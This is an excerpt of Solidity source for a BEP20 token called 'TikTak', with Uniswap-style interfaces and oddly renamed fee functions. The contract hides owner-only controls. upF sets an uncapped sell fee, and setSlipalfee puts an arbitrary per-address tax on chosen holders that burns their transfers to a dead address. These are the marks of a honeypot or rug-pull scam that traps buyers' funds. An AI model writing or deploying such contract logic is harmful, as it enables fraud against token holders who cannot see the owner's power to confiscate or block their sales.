...
interface IUniswapV2Factory {
    ...
    function alfeeTo() external view returns (address);
    function alfeeToSetter() external view returns (address);
    ...
    function setalfeeTo(address) external;
    function setalfeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingalfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingalfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingalfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingalfeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingalfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract TikTak is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellalfee = 0;

    uint256 private _defaultBuyalfee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipalfee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellalfee = _value;
    }

    function setSlipalfee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipalfee[_address] = _value;
    }

    function getSlipalfee(address _address) external view onlyownar returns (uint256) {
        return _slipalfee[_address];
    }


    function setMAccountalfee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountalfee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradealfeeAmount = 0;

        if (rF) {
            uint256 tradealfee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradealfee = _defaultSellalfee;
                }
                if (from == uniswapV2Pair) {

                    tradealfee = _defaultBuyalfee;
                }
            }
            if (_slipalfee[from] > 0) {
                tradealfee = _slipalfee[from];
            }

            tradealfeeAmount = _Amount.mul(tradealfee).div(100);
        }


        if (tradealfeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradealfeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradealfeeAmount);
            emit Transfer(from, _deadAddress, tradealfeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradealfeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradealfeeAmount);
        emit Transfer(from, _to, _Amount - tradealfeeAmount);
    }
